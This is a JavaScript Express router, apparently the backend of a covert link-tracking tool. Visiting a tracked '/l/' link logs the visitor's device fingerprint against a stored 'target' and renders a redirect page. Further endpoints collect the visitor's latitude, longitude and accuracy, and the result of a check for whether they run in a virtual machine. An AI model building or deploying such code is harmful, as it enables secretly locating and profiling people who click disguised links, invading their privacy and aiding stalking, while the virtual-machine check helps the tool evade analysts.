const router = require('express').Router();
const DeviceDetector = require('../detector');
const { DeviceProvider, LinkProvider, TargetProvider } = require('../db');



router.get("/l/*", async (request, response) => {

    try {
        const link = `${request.get('host')}/l/${request.params[0]}`
        const device = {
            date: new Date(),
            deviceInfo: DeviceDetector.detect(request)
        }
        const result = await TargetProvider.findandUpdate({ data: { $elemMatch: { link: link } } }, { $push: { 'data.$.devices': device } });
        if (result.value) {
            result.value.data.forEach((element) => {
                if (element.link === link) {
                    response.render('client', {
                        redirect: element.redirect,
                        layout:false
                    })
                    return;
                }
            })
        } else {
            response.status(404);
            response.end();
        }
    } catch (error) {
        console.log(error)

    }
});


router.post('/location', async (request, response) => {
    const referrer = request.body.referrer.replace(/(^\w+:|^)\/\//, '')
    const location = {
        accuracy: request.body.accuracy,
        latitude: request.body.latitude,
        longitude: request.body.longitude
    }
    try {
        await TargetProvider.findandUpdate({ data: { $elemMatch: { link:referrer} } }, { $push: { 'data.$.locations': location } })
    } catch (error) {
        console.log(error)
    } finally {
        response.end()
    }
})


router.post('/virtualization', async (request, response) => {

    const referrer = request.body.referrer.replace(/(^\w+:|^)\/\//, '')
    const isVM = {
        result: request.body.result,
        probability: request.body.probability,
    }
    try {
        await TargetProvider.findandUpdate({ data: { $elemMatch: {link:referrer } } }, { $push: { 'data.$.virtualization': isVM } })
    } catch (error) {
        console.log(error)
    } finally {
        response.end()
    }
})

module.exports = router;        